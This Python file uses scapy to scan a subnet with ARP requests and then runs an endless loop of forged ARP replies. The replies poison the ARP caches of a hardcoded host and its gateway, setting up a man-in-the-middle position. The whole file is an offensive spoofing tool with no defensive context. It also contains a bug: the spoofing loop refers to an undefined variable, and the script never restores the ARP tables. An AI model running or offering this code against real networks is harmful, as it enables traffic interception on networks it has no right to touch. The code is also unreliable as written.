#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time, sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout= 1, verbose= False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst= target_ip, hwdst= target_mac, psrc= spoof_ip)
    scapy.send(packet, verbose= False)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP address(es)")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target, use --help for more info.")
    return options

def scan(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout= 1, verbose= False)[0]

    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    return clients_list

def print_result(results_list):
    print("IP\t\t\tMAC Address\n-------------------------------------------------")
    for client in results_list:
        print(client["ip"] + "\t\t" + client["mac"])

options = get_arguments()
scan_result = scan(options.target) # "10.20.14.1/24"
print_result(scan_result)

sent_packets_count = 0
while True:
    for client in results_list:
        print(client["ip"] + "\t\t" + client["mac"])

        spoof("10.20.14.204", "10.20.14.1")
        spoof("10.20.14.1", "10.20.14.204")
        sent_packets_count += 2
        # print("\r[+] Packets sent : " + str(sent_packets_count)), # Python2
        print("\r[+] Packets sent : " + str(sent_packets_count), end="")
        # sys.stdout.flush() # Python2
        time.sleep(2)